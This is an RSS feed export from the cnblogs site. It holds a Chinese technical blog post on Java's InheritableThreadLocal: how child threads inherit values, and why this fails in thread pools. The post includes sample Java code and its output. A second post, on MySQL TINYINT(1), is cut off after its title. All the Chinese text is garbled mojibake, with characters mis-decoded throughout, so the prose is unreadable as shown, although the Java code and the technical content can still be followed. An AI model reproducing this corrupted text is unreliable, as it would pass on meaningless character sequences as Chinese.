<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-01-19T01:21:49.415Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ InheritableThreadLocalï¼ä»å¥é¨å°æ¾å¼ ]]></title>
    <link>https://www.cnblogs.com/sevencoding/p/19484504</link>
    <guid>efa9ba54d309498c54721a4a312bc445</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sevencoding/p/19484504" title="åå¸äº 2026-01-19 09:00">
    <span role="heading" aria-level="2">InheritableThreadLocalï¼ä»å¥é¨å°æ¾å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>InheritableThreadLocalç¸æ¯ThreadLocalå¤ä¸ä¸ªè½åï¼å¨åå»ºå­çº¿ç¨Threadæ¶ï¼å­çº¿ç¨Threadä¼èªå¨ç»§æ¿ç¶çº¿ç¨çInheritableThreadLocalä¿¡æ¯å°å­çº¿ç¨ä¸­ï¼è¿èå®ç°å¨å¨å­çº¿ç¨è·åç¶çº¿ç¨çInheritableThreadLocalå¼çç®çã</p>
<p>å³äºThreadLocalè¯¦ç»åå®¹ï¼å¯ä»¥çè¿ç¯æç« ï¼<a href="https://mp.weixin.qq.com/s?__biz=MzkwNjc0MzU1Mg==&amp;mid=2247484942&amp;idx=1&amp;sn=7e414e401be057e6bf8dde163d9387d9&amp;chksm=c0e29c61f7951577a7f1f037fa5ee68c445116b6e0de82ca4321fe18d66de6fea8d33cbdc232&amp;token=1187469911&amp;lang=zh_CN#rd" target="_blank" rel="noopener nofollow">å²ä¸æå¨ThreadLocal è¯¦è§£</a></p>
<h2 id="å-threadlocal-çåºå«">å ThreadLocal çåºå«</h2>
<p>ä¸¾ä¸ªç®åçæ å­å¯¹æ¯ä¸InheritableThreadLocalåThreadLocalï¼</p>
<pre><code class="language-java">public&nbsp;class&nbsp;InheritableThreadLocalTest&nbsp;{&nbsp; &nbsp;&nbsp;
	private&nbsp;static&nbsp;final ThreadLocal&lt;String&gt; threadLocal =&nbsp;new&nbsp;ThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;
	private&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;

	public&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; 
		testThreadLocal();&nbsp; &nbsp; &nbsp; &nbsp; 
		testInheritableThreadLocal();&nbsp; &nbsp; 
	}&nbsp; &nbsp;&nbsp;

	/**&nbsp; &nbsp; &nbsp;* threadLocalæµè¯&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;
	public&nbsp;static&nbsp;void&nbsp;testThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;
		&nbsp;// å¨ä¸»çº¿ç¨ä¸­è®¾ç½®å¼å°threadLocal&nbsp; &nbsp; &nbsp; &nbsp; 
		&nbsp;threadLocal.set("ææ¯ç¶çº¿ç¨threadLocalçå¼");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		&nbsp;// åå»ºä¸ä¸ªæ°çº¿ç¨å¹¶å¯å¨&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		&nbsp;new&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
				&nbsp;// å¨å­çº¿ç¨éé¢æ æ³è·åå°ç¶çº¿ç¨è®¾ç½®çthreadLocalï¼ç»æä¸ºnull&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
				&nbsp;System.out.println("ä»å­çº¿ç¨è·åå°threadLocalçå¼: "&nbsp;+ threadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp;    }
		&nbsp;).start();&nbsp; &nbsp; 
	&nbsp;}&nbsp; &nbsp;&nbsp;
&nbsp;
	&nbsp;/**&nbsp; &nbsp; &nbsp;* inheritableThreadLocalæµè¯&nbsp; &nbsp; &nbsp;*/&nbsp; 
	public&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		// å¨ä¸»çº¿ç¨ä¸­è®¾ç½®ä¸ä¸ªå¼å°inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; 
		inheritableThreadLocal.set("ææ¯ç¶çº¿ç¨inheritableThreadLocalçå¼");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		// åå»ºä¸ä¸ªæ°çº¿ç¨å¹¶å¯å¨&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		new&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
				// å¨å­çº¿ç¨éé¢å¯ä»¥èªå¨è·åå°ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocal&nbsp; &nbsp; 
				System.out.println("ä»å­çº¿ç¨è·åå°inheritableThreadLocalçå¼: "&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; 
			}).start();&nbsp; &nbsp; 
		}
	}
</code></pre>
<p>æ§è¡ç»æï¼</p>
<pre><code class="language-text">ä»å­çº¿ç¨è·åå°threadLocalçå¼:null
ä»å­çº¿ç¨è·åå°inheritableThreadLocalçå¼:ææ¯ç¶çº¿ç¨inheritableThreadLocalçå¼
</code></pre>
<p>å¯ä»¥çå°å­çº¿ç¨ä¸­å¯ä»¥è·åå°ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalå¼ï¼ä½ä¸è½è·åå°ç¶çº¿ç¨è®¾ç½®çthreadLocalå¼</p>
<h2 id="å®ç°åç">å®ç°åç</h2>
<p>InheritableThreadLocal çå®ç°åçç¸å½ç²¾å¦ï¼å®éè¿å¨åå»ºå­çº¿ç¨çç¬é´ï¼âå¤å¶âç¶çº¿ç¨ççº¿ç¨å±é¨åéï¼ä»èå®ç°äºæ°æ®ä»ç¶çº¿ç¨å°å­çº¿ç¨ç<strong>ä¸æ¬¡æ§ãåå»ºæ¶</strong>çä¼ é ã</p>
<p>å¶æ ¸å¿å·¥ä½åçå¯ä»¥æ¸æ°å°éè¿ä»¥ä¸åºåå¾å±ç¤ºï¼å®æç»äºå½ç¶çº¿ç¨åå»ºä¸ä¸ªå­çº¿ç¨æ¶ï¼æ°æ®æ¯å¦ä½è¢«ä¼ éçï¼</p>
<div class="mermaid">sequenceDiagram
    participant Parent as ç¶çº¿ç¨
    participant Thread as Threadæé æ¹æ³
    participant ITL as InheritableThreadLocal
    participant ThMap as ThreadLocalMap
    participant Child as å­çº¿ç¨

    Parent-&gt;&gt;Thread: åå»º new Thread()
    Note over Parent,Thread: å³é®æ­¥éª¤ï¼åå§å
    Thread-&gt;&gt;Thread: è°ç¨ init() æ¹æ³
    Note over Thread,ITL: æ£æ¥ç¶çº¿ç¨ç inheritableThreadLocals
    Thread-&gt;&gt;+ThMap: createInheritedMap(&lt;br/&gt;parent.inheritableThreadLocals)
    ThMap-&gt;&gt;ThMap: æ°å»ºä¸ä¸ªThreadLocalMap
    loop éåç¶çº¿ç¨Mapä¸­çæ¯ä¸ªEntry
        ThMap-&gt;&gt;+ITL: è°ç¨ key.childValue(parentValue)
        ITL--&gt;&gt;-ThMap: è¿åå­çº¿ç¨åå§å¼&lt;br/&gt;(é»è®¤è¿åç¶å¼ï¼å¯éå)
        ThMap-&gt;&gt;ThMap: å° (key, value) æ¾å¥æ°Map
    end
    ThMap--&gt;&gt;-Thread: è¿åæ°çThreadLocalMapå¯¹è±¡
    Thread-&gt;&gt;Child: å°æ°Mapèµç»å­çº¿ç¨ç&lt;br/&gt;inheritableThreadLocalså±æ§
    Note over Child: å­çº¿ç¨æ¥æç¶çº¿ç¨åéçå¯æ¬
</div><p>ä¸é¢æä»¬æ¥è¯¦ç»æè§£å¾ä¸­çå³é®ç¯èã</p>
<h3 id="æ ¸å¿å®ç°æºå¶">æ ¸å¿å®ç°æºå¶</h3>
<ol>
<li>**æ°æ®ç»æåºç¡ï¼<code>Thread</code>ç±»åé¨ç»´æ¤äºä¸¤ä¸ª <code>ThreadLocalMap</code>ç±»åçåé ï¼
<ul>
<li><code>threadLocals</code>ï¼ç¨äºå­å¨æ®é <code>ThreadLocal</code>è®¾ç½®çåéå¯æ¬ã</li>
<li><code>inheritableThreadLocals</code>ï¼ä¸é¨ç¨äºå­å¨ <code>InheritableThreadLocal</code>è®¾ç½®çåéå¯æ¬ ã<code>InheritableThreadLocal</code>éè¿éå <code>getMap</code>å <code>createMap</code>æ¹æ³ï¼ä½¿å¶æææä½é½éå¯¹ <code>inheritableThreadLocals</code>å­æ®µï¼ä»èä¸æ®é <code>ThreadLocal</code>åç¦»å¼ ã</li>
</ul>
</li>
<li><strong>ç»§æ¿è§¦åæ¶å»ï¼å­çº¿ç¨çåå»º</strong>ãç»§æ¿è¡ä¸ºåçå¨å­çº¿ç¨è¢«åå»ºï¼å³æ§è¡ <code>new Thread()</code>ï¼æ¶ãå¨ <code>Thread</code>ç±»ç <code>init</code>æ¹æ³ä¸­ï¼å¦æå¤æ­éè¦ç»§æ¿ï¼<code>inheritThreadLocals</code>åæ°ä¸º <code>true</code>ï¼<strong>ä¸</strong>ç¶çº¿ç¨ï¼å½åçº¿ç¨ï¼ç <code>inheritableThreadLocals</code>ä¸ä¸º <code>null</code>ï¼åä¼æ§è¡å¤å¶é»è¾ ã</li>
<li><strong>å¤å¶è¿ç¨çæ ¸å¿ï¼<code>createInheritedMap</code></strong>ãè¿æ¯å®ç°å¤å¶çæ ¸å¿æ¹æ³ ãå®ä¼åå»ºä¸ä¸ªæ°ç <code>ThreadLocalMap</code>ï¼å¹¶å°ç¶çº¿ç¨ <code>inheritableThreadLocals</code>ä¸­çæææ¡ç®éåæ·è´å°æ° Map ä¸­ã
<ul>
<li><strong>Keyçå¤å¶</strong>ï¼Keyï¼å³ <code>InheritableThreadLocal</code>å¯¹è±¡æ¬èº«ï¼æ¯ç´æ¥å¤å¶çå¼ç¨ã</li>
<li><strong>Valueççæ</strong>ï¼Value å¹¶éç´æ¥å¤å¶å¼ç¨ï¼èæ¯éè¿è°ç¨ <code>InheritableThreadLocal</code>ç <code>childValue(T parentValue)</code>æ¹æ³æ¥çæå­çº¿ç¨ä¸­çåå§å¼ã<strong>é»è®¤å®ç°æ¯ç´æ¥è¿åç¶å¼</strong>ï¼<code>return parentValue;</code>ï¼ï¼è¿æå³çå¯¹äºå¯¹è±¡ç±»åï¼ç¶å­çº¿ç¨å°å±äº«åä¸ä¸ªå¯¹è±¡å¼ç¨ ã</li>
</ul>
</li>
</ol>
<h3 id="å³é®ç¹æ§ä¸æ³¨æäºé¡¹">å³é®ç¹æ§ä¸æ³¨æäºé¡¹</h3>
<ol>
<li><strong>åå»ºæ¶å¤å¶ï¼åç»­ç¬ç«</strong>ï¼ç»§æ¿åªåçä¸æ¬¡ï¼å³å¨å­çº¿ç¨å¯¹è±¡åå»ºçç¬é´ãæ­¤åï¼ç¶çº¿ç¨åå­çº¿ç¨å¯¹åèª <code>InheritableThreadLocal</code>åéçä¿®æ¹äºä¸å½±å ã</li>
<li><strong>å¨çº¿ç¨æ± ä¸­çå±éæ§</strong>ï¼è¿æ¯ <code>InheritableThreadLocal</code>æéè¦è­¦æçé®é¢ãçº¿ç¨æ± ä¸­ççº¿ç¨æ¯å¤ç¨çï¼è¿äºçº¿ç¨å¨é¦æ¬¡åå»ºæ¶å¯è½å·²ç»ä»æä¸ªç¶çº¿ç¨ç»§æ¿äºå¼ãä½å½å®ä»¬è¢«ç¨äºæ§è¡æ°çä»»å¡æ¶ï¼æ°çä»»å¡æäº¤çº¿ç¨ï¼é»è¾ä¸çâç¶çº¿ç¨âï¼ä¸å·¥ä½çº¿ç¨å·²æ ç´æ¥çåå»ºå³ç³»ï¼å æ­¤ä¹åç»§æ¿çå¼ä¸ä¼æ´æ°ï¼è¿ä¼å¯¼è´<strong>æ°æ®éä¹±</strong>ï¼å¦ç¨æ·Açä»»å¡æ¿å°äºç¨æ·Bçä¿¡æ¯ï¼æ<strong>åå­æ³æ¼</strong>â ãå¯¹äºçº¿ç¨æ± åºæ¯ï¼åºèèä½¿ç¨é¿éå¼æºç <strong>TransmittableThreadLocal (TTL)</strong>â ã</li>
<li><strong>æµæ·è´ä¸å¯¹è±¡å±äº«</strong>ï¼ç±äº <code>childValue</code>æ¹æ³é»è®¤æ¯æµæ·è´ï¼å¦æå­å¥çæ¯å¯åå¯¹è±¡ï¼å¦ <code>Map</code>ã<code>List</code>ï¼ï¼ç¶å­çº¿ç¨å®éææçæ¯åä¸ä¸ªå¯¹è±¡çå¼ç¨ãå¨ä¸ä¸ªçº¿ç¨ä¸­ä¿®æ¹è¯¥å¯¹è±¡çåé¨ç¶æï¼ä¼ç´æ¥å½±åå¦ä¸ä¸ªçº¿ç¨ ãè¥ééç¦»ï¼å¯ä»¥éå <code>childValue</code>æ¹æ³å®ç°æ·±æ·è´ ã</li>
<li><strong>åå­æ³æ¼é£é©</strong>ï¼ä¸ <code>ThreadLocal</code>ç±»ä¼¼ï¼å¦æçº¿ç¨é¿æ¶é´è¿è¡ï¼å¦çº¿ç¨æ± ä¸­çæ ¸å¿çº¿ç¨ï¼ï¼å¹¶ä¸æªåæ¶è°ç¨ <code>remove</code>æ¹æ³æ¸çï¼é£ä¹è¯¥çº¿ç¨ç <code>inheritableThreadLocals</code>ä¼ä¸ç´ææå¼çå¼ºå¼ç¨ï¼å¯¼è´æ æ³è¢«GCåæ¶ãè¯å¥½çå®è·µæ¯å¨ä»»å¡æ§è¡å®æ¯åä¸»å¨è°ç¨ <code>remove()</code></li>
</ol>
<h3 id="çº¿ç¨æ± ä¸­å±éæ§">çº¿ç¨æ± ä¸­å±éæ§</h3>
<p>ä¸è¬æ¥è¯´ï¼å¨çå®çä¸å¡åºæ¯ä¸ï¼æ²¡äººä¼ç´æ¥ new Threadï¼èé½æ¯ä½¿ç¨çº¿ç¨æ± çï¼å æ­¤<code>InheritableThreadLocal</code>å¨çº¿ç¨æ± ä¸­çä½¿ç¨å±éæ§è¦é¢å¤æ³¨æ</p>
<p>é¦åï¼æä»¬åçè§£ <code>InheritableThreadLocal</code>çç»§æ¿åæ</p>
<ul>
<li><code>InheritableThreadLocal</code>çç»§æ¿åªåçå¨ <strong>æ°çº¿ç¨è¢«åå»ºæ¶</strong>ï¼å³ <code>new Thread()</code>å¹¶å¯å¨æ¶ï¼ãå¨åå»ºè¿ç¨ä¸­ï¼å­çº¿ç¨ä¼å¤å¶ç¶çº¿ç¨ç <code>InheritableThreadLocal</code>å¼ã</li>
<li>å¨çº¿ç¨æ± ä¸­ï¼çº¿ç¨æ¯é¢ååå»ºææéåå»ºçï¼å¹¶ä¸ä¼è¢«å¤ç¨ãå æ­¤ï¼ç»§æ¿åªä¼å¨çº¿ç¨æ± <strong>åå»ºæ°çº¿ç¨</strong>æ¶åçï¼èä¸ä¼å¨å¤ç¨ç°æçº¿ç¨æ¶åçã</li>
</ul>
<p>åççº¿ç¨æ± åå»ºæ°çº¿ç¨çæ¡ä»¶ï¼å¯¹äºæ åç <code>ThreadPoolExecutor</code>ï¼æ°çº¿ç¨çåå»ºéµå¾ªä»¥ä¸è§åï¼</p>
<ol>
<li><strong>å½åçº¿ç¨æ° &lt; æ ¸å¿çº¿ç¨æ°</strong>ï¼å½æäº¤æ°ä»»å¡æ¶ï¼å¦æå½åè¿è¡ççº¿ç¨æ°å°äºæ ¸å¿çº¿ç¨æ°ï¼å³ä½¿æç©ºé²çº¿ç¨ï¼çº¿ç¨æ± ä¹ä¼åå»ºæ°çº¿ç¨æ¥å¤çä»»å¡ãæ­¤æ¶ï¼æ°çº¿ç¨ä¼ç»§æ¿ç¶çº¿ç¨ï¼æäº¤ä»»å¡ççº¿ç¨ï¼ç <code>InheritableThreadLocal</code>ã</li>
<li><strong>å½åçº¿ç¨æ° &gt;= æ ¸å¿çº¿ç¨æ° &amp;&amp; éåå·²æ»¡ &amp;&amp; çº¿ç¨æ° &lt; æå¤§çº¿ç¨æ°</strong>ï¼å½ä»»å¡éåå·²æ»¡ï¼ä¸å½åçº¿ç¨æ°å°äºæå¤§çº¿ç¨æ°æ¶ï¼çº¿ç¨æ± ä¼åå»ºæ°çº¿ç¨æ¥å¤çä»»å¡ãåæ ·ï¼æ°çº¿ç¨ä¼ç»§æ¿ç¶çº¿ç¨ç <code>InheritableThreadLocal</code>ã</li>
</ol>
<p>ä¸ä¼ç»§æ¿çåºæ¯</p>
<ul>
<li><strong>çº¿ç¨å¤ç¨</strong>ï¼å½çº¿ç¨æ± ä¸­æç©ºé²çº¿ç¨æ¶ï¼ä¾å¦ï¼å½åçº¿ç¨æ° &gt;= æ ¸å¿çº¿ç¨æ°ï¼ä½éåæªæ»¡ï¼ï¼ä»»å¡ä¼è¢«åéç»ç°æçº¿ç¨æ§è¡ãæ­¤æ¶ï¼æ²¡ææ°çº¿ç¨åå»ºï¼å æ­¤ä¸ä¼åçç»§æ¿ãç°æçº¿ç¨ç <code>InheritableThreadLocal</code>å¼ä¿æä¸åï¼å¯è½æ¯ä¹åä»»å¡è®¾ç½®çå¼ï¼ï¼è¿å¯è½å¯¼è´æ°æ®éä¹±ï¼å¦ç¨æ·Açä»»å¡çå°ç¨æ·Bçæ°æ®ï¼ã</li>
<li><strong>çº¿ç¨æ°å·²è¾¾æå¤§å¼</strong>ï¼å¦æçº¿ç¨æ°å·²è¾¾æå¤§çº¿ç¨æ°ï¼ä¸éåå·²æ»¡ï¼æ°ä»»å¡ä¼è¢«æç»ï¼æ ¹æ®æç»ç­ç¥ï¼ï¼ä¹ä¸ä¼åå»ºæ°çº¿ç¨ï¼å æ­¤ä¸ä¼ç»§æ¿ã</li>
</ul>
<p>ä¸åªæ¯çº¿ç¨æ± æ±¡æï¼çº¿ç¨æ± ä½¿ç¨ <code>InheritableThreadLocal</code> è¿å¯è½å­å¨è·åä¸å°å¼çæåµãä¾å¦ï¼å¨æ§è¡å¼æ­¥ä»»å¡çæ¶åï¼å¤ç¨äºæä¸ªå·²æççº¿ç¨Aï¼å¹¶ä¸å½æ¶åå»ºè¯¥çº¿ç¨Açæ¶åï¼æ²¡æç»§æ¿InheritableThreadLocalï¼è¿èå¯¼è´åé¢å¤ç¨è¯¥çº¿ç¨çæ¶åï¼ä»InheritableThreadLocalè·åå°çå¼ä¸ºnullï¼</p>
<pre><code class="language-java">public&nbsp;class&nbsp;InheritableThreadLocalWithThreadPoolTest&nbsp;{&nbsp; &nbsp;&nbsp;
	private&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;
	// è¿éçº¿ç¨æ± core/maxæ°éé½åªæ2&nbsp; &nbsp;&nbsp;
	private&nbsp;static&nbsp;final ThreadPoolExecutor threadPoolExecutor =&nbsp;new&nbsp;ThreadPoolExecutor(&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		0L,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
		TimeUnit.MILLISECONDS,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		new&nbsp;LinkedBlockingQueue&lt;Runnable&gt;(3000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		new&nbsp;ThreadPoolExecutor.CallerRunsPolicy()&nbsp; &nbsp; 
	);&nbsp; &nbsp;&nbsp;
	
	public&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	// åæ§è¡äºä¸æ¶åInheritableThreadLocalçå­ä»»å¡åå§åçº¿ç¨æ± çº¿ç¨&nbsp;
	 &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; // åæ§è¡äºæ¶åInheritableThreadLocal
	 &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool("å¼ ä¸");&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool("æå");&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; threadPoolExecutor.shutdown();&nbsp; &nbsp; 
	 }&nbsp; &nbsp;&nbsp;
	 
	 /**&nbsp; &nbsp; &nbsp;* inheritableThreadLocal+çº¿ç¨æ± æµè¯&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;
	&nbsp; &nbsp; public&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocalWithThreadPool(String param)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		&nbsp; &nbsp; // 1. å¨ä¸»çº¿ç¨ä¸­è®¾ç½®ä¸ä¸ªå¼å°inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; &nbsp; inheritableThreadLocal.set(param);&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; &nbsp;// 2. æäº¤å¼æ­¥ä»»å¡å°çº¿ç¨æ± &nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; &nbsp;threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; &nbsp;// 3. å¨çº¿ç¨æ± -å­çº¿ç¨éé¢å¯ä»¥è·åå°ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalåï¼&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
		 &nbsp; &nbsp; &nbsp; &nbsp;System.out.println("çº¿ç¨å: "&nbsp;+ Thread.currentThread().getName() +&nbsp;", ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalå¼: "&nbsp;+ param +&nbsp;", å­çº¿ç¨è·åå°inheritableThreadLocalçå¼: "&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; &nbsp;// 4. æ¸é¤inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; &nbsp;inheritableThreadLocal.remove();&nbsp; &nbsp; 
	 &nbsp; }&nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; /**&nbsp; &nbsp; &nbsp;* æ¨¡æå¦ä¸ä¸ªç¬ç«çåè½&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;
	 &nbsp; public&nbsp;static&nbsp;void&nbsp;testAnotherFunction()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
		 &nbsp; // æäº¤å¼æ­¥ä»»å¡å°çº¿ç¨æ± &nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
	 &nbsp; &nbsp; &nbsp; // å¨çº¿ç¨æ± -å­çº¿ç¨éé¢å¯ä»¥è·åå°ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalåï¼&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
		 &nbsp; &nbsp; &nbsp; System.out.println("çº¿ç¨å: "&nbsp;+ Thread.currentThread().getName() +&nbsp;", çº¿ç¨æ± -å­çº¿ç¨æ¸ä¸ªé±¼");&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; });&nbsp; &nbsp; 
	 &nbsp; }
}
</code></pre>
<p>æ§è¡ç»æï¼</p>
<pre><code class="language-text">çº¿ç¨å:pool-1-thread-2,çº¿ç¨æ± -å­çº¿ç¨æ¸ä¸ªé±¼
çº¿ç¨å:pool-1-thread-1,çº¿ç¨æ± -å­çº¿ç¨æ¸ä¸ªé±¼
çº¿ç¨å:pool-1-thread-1,ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalå¼:æåï¼å­çº¿ç¨è·åå°inheritableThreadLocalçå¼:null
çº¿ç¨å:pool-1-thread-2,ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalå¼:å¼ ä¸ï¼å­çº¿ç¨è·åå°inheritableThreadLocalçå¼:null
</code></pre>
<p>å½ç¶äºï¼è§£å³è¿ä¸ªé®é¢å¯ä»¥èèä½¿ç¨é¿éå¼æºç <strong>TransmittableThreadLocal (TTL)</strong>ï¼âæèå¨æäº¤å¼æ­¥ä»»å¡åï¼åè·åçº¿ç¨æ°æ®ï¼åä¼ å¥ãä¾å¦ï¼</p>
<pre><code class="language-java">// 1. å¨ä¸»çº¿ç¨ä¸­åè·åinheritableThreadLocalçå¼
String name = inheritableThreadLocal.get();&nbsp; &nbsp; 
&nbsp; &nbsp;&nbsp;
// 2. æäº¤å¼æ­¥ä»»å¡å°çº¿ç¨æ± &nbsp; &nbsp; &nbsp; &nbsp; 
threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
// 3. å¨çº¿ç¨æ± -å­çº¿ç¨éé¢ç´æ¥ä¼ å¥æ°æ®&nbsp; 
System.out.println("çº¿ç¨å: "&nbsp;+ Thread.currentThread().getName() +&nbsp;", ç¶çº¿ç¨è®¾ç½®çinheritableThreadLocalå¼: "&nbsp;+ param +&nbsp;", å­çº¿ç¨è·åå°inheritableThreadLocalçå¼: "&nbsp;+ name);&nbsp; &nbsp; &nbsp; &nbsp; 
	 &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
</code></pre>
<h2 id="ä¸-threadlocal-çå¯¹æ¯">ä¸ ThreadLocal çå¯¹æ¯</h2>
<table>
<thead>
<tr>
<th>ç¹æ§</th>
<th>ThreadLocal</th>
<th>InheritableThreadLocal</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>æ°æ®éç¦»</strong>â</td>
<td>çº¿ç¨ç»å¯¹éç¦»</td>
<td>çº¿ç¨ç»å¯¹éç¦»</td>
</tr>
<tr>
<td><strong>å­çº¿ç¨ç»§æ¿</strong>â</td>
<td><strong>ä¸æ¯æ</strong>â</td>
<td><strong>æ¯æ</strong>ï¼åå»ºæ¶ï¼</td>
</tr>
<tr>
<td><strong>åºå±å­å¨å­æ®µ</strong>â</td>
<td><code>Thread.threadLocals</code></td>
<td><code>Thread.inheritableThreadLocals</code></td>
</tr>
<tr>
<td><strong>éç¨åºæ¯</strong>â</td>
<td>çº¿ç¨åå¨å±åéï¼é¿åä¼ å</td>
<td><strong>ç¶å­çº¿ç¨é´</strong>éè¦ä¼ éä¸ä¸ææ°æ®</td>
</tr>
</tbody>
</table>

</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªå¨çº¿ç½ç«ï¼sevençèé¸æé¿ä¹è·¯ï¼ä½èï¼sevenï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼www.seven97.top</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-19 09:00">2026-01-19 09:00</span>&nbsp;
<a href="https://www.cnblogs.com/sevencoding">ç¨åºåSeven</a>&nbsp;
éè¯»(<span id="post_view_count">15</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19484504);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19484504', targetLink: 'https://www.cnblogs.com/sevencoding/p/19484504', title: 'InheritableThreadLocalï¼ä»å¥é¨å°æ¾å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ TINYINT(1) ç±»åçå­æ®µï¼æææ°æ®å­çæ¯ 2ï¼ä¸ºä»ä¹æ¥åºæ¥æ¯ true ]]></title>
    <link>https://www.cnblogs.com/youzhibing/p/19498073</link>
    <guid>e4a9fc39e0c97bbdc745ac6deb42c61f</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/youzhibing/p/19498073" title="åå¸äº 2026-01-19 08:58">
    <span role="heading" aria-level="2">TINYINT(1) ç±»åçå­æ®µï¼æææ°æ®å­çæ¯ 2ï¼ä¸ºä»ä¹æ¥åºæ¥æ¯ true</span>
    

</a>

            </h1>
            <div class="clear"></div>
